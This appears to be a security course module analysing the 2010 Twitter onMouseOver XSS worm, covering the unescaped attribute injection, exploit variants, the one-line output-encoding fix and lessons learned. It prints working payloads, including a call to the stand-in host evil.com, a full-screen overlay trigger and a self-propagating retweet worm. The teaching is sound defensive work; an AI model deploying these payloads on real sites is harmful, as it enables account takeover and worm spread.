Twitter onMouseOver Worm — September 21, 2010

REFLECTED + STORED XSS ATTRIBUTE INJECTION Impact: Tens of thousands of infected tweets  |  Fixed within hours  |  Module: M16

Background

On September 21, 2010, Twitter users discovered that tweet text was not being properly HTML-encoded before being inserted into the page. Specifically, text in tweet content was reflected into HTML attribute contexts without escaping, allowing event handler injection via onmouseover.

Multiple exploiters — some malicious, some testing — published self-retweeting payloads within hours of each other. Tens of thousands of infected tweets appeared. The payloads caused popups, redirected users to NSFW sites, posted spam tweets, and in one variant covered the entire page to maximise mouseover triggering.

Twitter's engineering team deployed a fix within hours, but not before the worm had spread significantly and received major media coverage.

The Vulnerability

Twitter's tweet rendering inserted tweet text directly into an HTML context. The tweet text was placed inside a <span> tag's inner content — but when the text contained special characters like " and >, these were not escaped.

A tweet containing:

onmouseover="alert(document.cookie)"

Was rendered as:

<span class="tweet-text" onmouseover="alert(document.cookie)">...</span>

This is a classic HTML attribute injection — the injection closes the existing attribute and adds a new event handler. The tweet text was never supposed to contain raw attribute injection, but the absence of output encoding made it possible.

Exploit Variants

Basic popup:

onmouseover=".open('http://evil.com')"

Full-screen overlay for guaranteed trigger:

style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999"
onmousemove="/* payload */"

This variant made the payload fire for any mouse movement on the page — no interaction required on the tweet itself.

Self-retweeting worm:

onmouseover="document.getElementById('status').value=this.outerHTML;
  document.forms['update'].submit()"

This populated the tweet compose box with the worm payload and auto-submitted it, infecting the viewer's account and propagating to their followers.

Key observation: The "full-screen" trick is a general technique for making mouseover/mousemove payloads near-certain to fire. A position:fixed; width:100%; height:100% element covers the viewport. Any mouse movement anywhere on the page triggers the event. This technique appears in bug bounty reports to increase PoC impact.

The Fix

One line of code: apply HTML output encoding to tweet text before inserting it into the page template. The character " must be encoded as &quot; (or ") when inside an HTML attribute context. The character > must be encoded as &gt;.

In any template engine: use auto-escaping. In Django: {{ tweet.text }} (not {{ tweet.text | safe }}). In Flask/Jinja2: same. In React: {tweet.text} in JSX (not dangerouslySetInnerHTML). The default is safe; the vulnerability was opting out of the default.

Lessons

  1. Even the most security-aware companies ship classic XSS bugs. Twitter was a major tech company with security engineers when this bug shipped.
  2. The time from disclosure to weaponisation was hours. The time from weaponisation to tens of thousands of infected accounts was also hours. XSS bugs in social contexts spread faster than patches can be deployed.
  3. The fix was one line. The cost was vastly disproportionate to the effort of the fix. Output encoding is the cheapest security control per-impact-prevented of any web security measure.
  4. The full-screen overlay technique demonstrates that "requires user interaction" (mouseover) does not meaningfully limit XSS impact — interaction is trivial to force.
